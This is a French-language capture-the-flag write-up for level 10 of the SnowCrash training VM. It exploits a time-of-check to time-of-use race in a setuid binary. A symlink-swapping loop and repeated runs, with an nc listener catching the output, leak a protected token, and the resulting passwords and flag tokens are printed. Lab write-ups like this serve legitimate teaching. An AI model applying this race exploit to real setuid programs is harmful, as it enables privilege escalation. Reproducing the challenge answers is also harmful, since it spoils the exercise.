# LEVEL 10

### Reconnaissance

En se connectant au level10, on a un binaire et un fichier token ou on a pas les droits de lecture dessus:

```
level10@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
level10@SnowCrash:~$ cat token 
cat: token: Permission denied
```

En lancant le binaire, on voit qu'il attend un fichier et un client a qui se connecter:

```
level10@SnowCrash:~$ ./level10 
./level10 file host
	sends file to host if you have access to it
```

On peux téléchargé le binaire pour le reverse, sa nous permettra dans savoir plus dans son fonctionnement.

On voit 2 choses interessantes:

- Le port utilisé pour la connection (6969)
```
0x08048756      b87b8a0408     mov eax, str.Connecting_to__s:6969_.. ; .//level10.c:31 ; 0x8048a7b ; "Connecting to %s:6969 .. "
```
- L'utilisation de la fonction access
```
0x08048749      e892feffff     call sym.imp.access         ; int access(const char *path, int mode)
```

Essayons de faire fonctionné ce binaire

```
level10@SnowCrash:~$ echo 'testing' > /tmp/test1
level10@SnowCrash:~$ ./level10 /tmp/test1 127.0.0.1
Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
level10@SnowCrash:~$ nc -l 6969 > /dev/pts/0 &
[1] 7697
level10@SnowCrash:~$ ./level10 /tmp/test1 127.0.0.1
Connecting to 127.0.0.1:6969 .. .*( )*.
Connected!
Sending file .. testing
wrote file!
[1]+  Done                    nc -l 6969 > /dev/pts/0
```
Sa marche, maintenant intéressons nous a comment l'exploité ?

La fonction qui nous interesse (access) nous permet de faire une attaque de type : <a href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use">Time-of-check to time-of-use (**TOCTOU**)</a>

On a d'ailleur un super tutoriel <a href="https://samsclass.info/127/proj/E10.htm">ici</a>

Cette attaque joue sur le temps entre le moment ou le programme check l'acces (avec la fonction access) et le moment ou il ouvre le fichier:


Ok, maintenant qu'on a compris comment sa fonctionne on passe a la pratique !

### Exploitation


On ouvre 2 connections ssh:
- la première pour nos commande
- la deuxième pour recevoir les infos avec nc.
	
- **1er terminal**
```
	$ echo "public" > /tmp/public		# creation fichier ou on a des droits (normal, on le creer)
	$ ln -sf /tmp/public /tmp/flip		# creation d'un lien symbolique
	Si on lance notre binaire avec /tmp/public ou /tmp/flip, on aura exactement la meme chose.
	
	while true; do ln -sf $(pwd)/secret /tmp/flip; ln -sf /tmp/public /tmp/flip; done &
	$ for i in {1..300}; do ./level10 /tmp/flip 127.0.0.1; done
```

- **2eme terminal**
```
	$ for i in {1..300}; do nc -l 6969; done
	[...]
	public
	.*( )*.
	.*( )*.
	public
	.*( )*.
	woupa2yuojeeaaed06riuj63c
	.*( )*.
	public
	.*( )*.
	public
	[...]
```

Et voila, le mot de passe pour l'user flag10 est: **woupa2yuojeeaaed06riuj63c**

*ps : le mot de passe fonctionne pour l'user flag11*
	
```
level10@SnowCrash:~$ su flag10
Password: 
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
level10@SnowCrash:~$ su flag11
Password: 
Don't forget to launch getflag !
flag11@SnowCrash:~$ getflag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
